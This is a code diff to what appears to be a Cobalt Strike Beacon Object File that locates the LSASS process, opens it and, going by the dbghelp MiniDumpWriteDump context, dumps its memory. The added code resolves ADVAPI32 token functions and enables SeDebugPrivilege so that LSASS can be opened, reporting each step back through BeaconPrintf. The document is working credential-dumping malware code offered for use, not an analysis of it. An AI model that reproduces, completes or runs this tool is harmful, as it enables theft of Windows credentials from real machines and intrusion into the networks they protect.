@@ -29,7 +29,33 @@ DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetFileSize(HANDLE, LPDWORD);
 DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$SetFilePointer(HANDLE, LONG, PLONG, DWORD);
 DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
 
+DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
+DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$LookupPrivilegeValueA(LPCSTR, LPCSTR, PLUID);
+DECLSPEC_IMPORT BOOL    WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
+DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$GetCurrentProcess(void);
+
 DECLSPEC_IMPORT int __cdecl MSVCRT$_wcsicmp(const wchar_t*, const wchar_t*);
+
+static BOOL enable_debug_priv(void) {
+    HANDLE hToken;
+    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(),
+            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
+        return FALSE;
+
+    TOKEN_PRIVILEGES tp;
+    tp.PrivilegeCount = 1;
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+    if (!ADVAPI32$LookupPrivilegeValueA(NULL, "SeDebugPrivilege",
+            &tp.Privileges[0].Luid)) {
+        KERNEL32$CloseHandle(hToken);
+        return FALSE;
+    }
+
+    BOOL ok = ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
+    DWORD err = KERNEL32$GetLastError();
+    KERNEL32$CloseHandle(hToken);
+    return ok && (err == 0);
+}
 
 /* dbghelp.dll — loaded at runtime */
 typedef BOOL (WINAPI *MiniDumpWriteDumpFn)(
@@ -81,6 +107,14 @@ void go(char *args, int args_len) {
         return;
     }
     BeaconPrintf(CALLBACK_OUTPUT, "[*] LSASS PID: %u\n", lsass_pid);
+
+    /* Enable SeDebugPrivilege — required to open LSASS */
+    if (enable_debug_priv()) {
+        BeaconPrintf(CALLBACK_OUTPUT, "[*] SeDebugPrivilege enabled\n");
+    } else {
+        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to enable SeDebugPrivilege (error %u)\n",
+                     KERNEL32$GetLastError());
+    }
 
     /* Open LSASS */
     HANDLE hProcess = KERNEL32$OpenProcess(
